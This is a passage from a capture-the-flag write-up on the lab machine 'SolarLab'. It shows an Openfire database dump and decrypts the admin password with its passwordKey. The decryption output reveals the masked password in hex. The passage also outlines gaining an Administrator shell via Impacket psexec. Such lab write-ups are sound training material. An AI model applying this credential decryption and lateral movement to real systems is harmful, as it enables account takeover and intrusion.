</span></span><span style="display:flex;"><span>INSERT INTO OFOFFLINE VALUES(&#39;admin&#39;,1,&#39;001700223778861&#39;,127,&#39;&lt;message from=&#34;solarlab.htb&#34; to=&#34;admin@solarlab.htb&#34;&gt;&lt;body&gt;A server or plugin update was found: Openfire 4.7.5&lt;/body&gt;&lt;/message&gt;&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFOFFLINE VALUES(&#39;admin&#39;,2,&#39;001700223779069&#39;,125,&#39;&lt;message from=&#34;solarlab.htb&#34; to=&#34;admin@solarlab.htb&#34;&gt;&lt;body&gt;A server or plugin update was found: Search 1.7.4&lt;/body&gt;&lt;/message&gt;&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFOFFLINE VALUES(&#39;admin&#39;,6,&#39;001714131992714&#39;,127,&#39;&lt;message from=&#34;solarlab.htb&#34; to=&#34;admin@solarlab.htb&#34;&gt;&lt;body&gt;A server or plugin update was found: Openfire 4.8.1&lt;/body&gt;&lt;/message&gt;&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFOFFLINE VALUES(&#39;admin&#39;,7,&#39;001714131993136&#39;,125,&#39;&lt;message from=&#34;solarlab.htb&#34; to=&#34;admin@solarlab.htb&#34;&gt;&lt;body&gt;A server or plugin update was found: Search 1.7.4&lt;/body&gt;&lt;/message&gt;&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFOFFLINE VALUES(&#39;admin&#39;,11,&#39;001715023572659&#39;,127,&#39;&lt;message from=&#34;solarlab.htb&#34; to=&#34;admin@solarlab.htb&#34;&gt;&lt;body&gt;A server or plugin update was found: Openfire 4.8.1&lt;/body&gt;&lt;/message&gt;&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFOFFLINE VALUES(&#39;admin&#39;,12,&#39;001715023572956&#39;,125,&#39;&lt;message from=&#34;solarlab.htb&#34; to=&#34;admin@solarlab.htb&#34;&gt;&lt;body&gt;A server or plugin update was found: Search 1.7.4&lt;/body&gt;&lt;/message&gt;&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFID VALUES(18,1)
</span></span><span style="display:flex;"><span>INSERT INTO OFID VALUES(19,16)
</span></span><span style="display:flex;"><span>INSERT INTO OFID VALUES(23,1)
</span></span><span style="display:flex;"><span>INSERT INTO OFID VALUES(25,3)
</span></span><span style="display:flex;"><span>INSERT INTO OFID VALUES(26,2)
</span></span><span style="display:flex;"><span>INSERT INTO OFID VALUES(27,1)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;cache.MUCService&#39;&#39;conference&#39;&#39;RoomStatistics.maxLifetime&#39;,&#39;-1&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;cache.MUCService&#39;&#39;conference&#39;&#39;RoomStatistics.size&#39;,&#39;-1&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;cache.MUCService&#39;&#39;conference&#39;&#39;Rooms.maxLifetime&#39;,&#39;-1&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;cache.MUCService&#39;&#39;conference&#39;&#39;Rooms.size&#39;,&#39;-1&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;passwordKey&#39;,&#39;hGXiFzsKaAeYLjn&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;provider.admin.className&#39;,&#39;org.jivesoftware.openfire.admin.DefaultAdminProvider&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;provider.auth.className&#39;,&#39;org.jivesoftware.openfire.auth.DefaultAuthProvider&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;provider.group.className&#39;,&#39;org.jivesoftware.openfire.group.DefaultGroupProvider&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;provider.lockout.className&#39;,&#39;org.jivesoftware.openfire.lockout.DefaultLockOutProvider&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;provider.securityAudit.className&#39;,&#39;org.jivesoftware.openfire.security.DefaultSecurityAuditProvider&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;provider.user.className&#39;,&#39;org.jivesoftware.openfire.user.DefaultUserProvider&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;provider.vcard.className&#39;,&#39;org.jivesoftware.openfire.vcard.DefaultVCardProvider&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;update.lastCheck&#39;,&#39;1715023572956&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;xmpp.auth.anonymous&#39;,&#39;false&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;xmpp.domain&#39;,&#39;solarlab.htb&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;xmpp.proxy.enabled&#39;,&#39;false&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;xmpp.socket.ssl.active&#39;,&#39;true&#39;,0,NULL)
</span></span><span style="display:flex;"><span>INSERT INTO OFVERSION VALUES(&#39;openfire&#39;,34)
</span></span><span style="display:flex;"><span>INSERT INTO OFSECURITYAUDITLOG VALUES(1,&#39;admin&#39;,1700223751042,&#39;Successful admin console login attempt&#39;,&#39;solarlab.htb&#39;,&#39;The user logged in successfully to the admin console from address 127.0.0.1. &#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFSECURITYAUDITLOG VALUES(2,&#39;admin&#39;,1700223756534,&#39;edited file transfer proxy settings&#39;,&#39;solarlab.htb&#39;,&#39;port = 7777\u000ahardcodedAddress = null\u000aenabled = false&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFMUCSERVICE VALUES(1,&#39;conference&#39;,NULL,0)
</span></span><span style="display:flex;"><span>INSERT INTO OFPUBSUBNODE VALUES(&#39;pubsub&#39;,&#39;&#39;,0,&#39;001700223743445&#39;,&#39;001700223743445&#39;,NULL,0,0,0,0,1,1,1,0,0,&#39;publishers&#39;,1,0,&#39;open&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;solarlab.htb&#39;,&#39;&#39;,&#39;English&#39;,&#39;&#39;,NULL,&#39;all&#39;,-1)
</span></span><span style="display:flex;"><span>INSERT INTO OFPUBSUBAFFILIATION VALUES(&#39;pubsub&#39;,&#39;&#39;,&#39;solarlab.htb&#39;,&#39;owner&#39;)
</span></span><span style="display:flex;"><span>INSERT INTO OFPUBSUBDEFAULTCONF VALUES(&#39;pubsub&#39;,0,0,0,0,0,1,1,1,0,0,&#39;publishers&#39;,1,&#39;open&#39;,&#39;English&#39;,NULL,&#39;all&#39;,-1)
</span></span><span style="display:flex;"><span>INSERT INTO OFPUBSUBDEFAULTCONF VALUES(&#39;pubsub&#39;,1,1,10485760,0,1,1,1,1,0,1,&#39;publishers&#39;,1,&#39;open&#39;,&#39;English&#39;,NULL,&#39;all&#39;,-1)
</span></span></code></pre></div><p>The important parts are:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>INSERT INTO OFUSER VALUES(&#39;admin&#39;,&#39;gjMoswpK+HakPdvLIvp6eLKlYh0=&#39;,&#39;9MwNQcJ9bF4YeyZDdns5gvXp620=&#39;,&#39;yidQk5Skw11QJWTBAloAb28lYHftqa0x&#39;,4096,NULL,&#39;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#39;,&#39;Administrator&#39;,&#39;admin@solarlab.htb&#39;,&#39;001700223740785&#39;,&#39;0&#39;)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>INSERT INTO OFPROPERTY VALUES(&#39;passwordKey&#39;,&#39;hGXiFzsKaAeYLjn&#39;,0,NULL)
</span></span></code></pre></div><p>After a lot of struggle found a <a href="https://github.com/c0rdis/openfire_decrypt">Github Repo</a> that can decrypt the password hash if we have the <code>passwordKey</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ java OpenFireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn             
</span></span><span style="display:flex;"><span>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
</span></span><span style="display:flex;"><span>*************** (hex: 005400680069007300500061007300730077006F0072006400530068006F0075006C00640044006F00210040)
</span></span></code></pre></div><p><strong>Administrator Credential</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Administrator:**************
</span></span></code></pre></div><p>Using psexec by Impacket I was able get a shell as Administrator. ** psexec needs a writable share to upload a malicious binary to create a service using the Service Manager. It then uses this binary for the service&rsquo;s binPath and start the server. So, to get a shell using psexec we need following conditions:</p>
<ul>
<li>A writeable share to upload a malicious Binary</li>
<li>Proper privilege token assigned to add, start, stop and remove a service.</li>
</ul>
</li>
</ul>
<h2 id="summary">Summary</h2>
<p>I struggled to find a foothold on the box because I didn&rsquo;t test all the parameters to send the exploit. Also, after gaining openfire user&rsquo;s shell I also found it difficult to recover the Administrator password because I lacked the knowledge of openfire password decryption tool.
Overall, my recon was good.</p>
]]></description></item></channel></rss>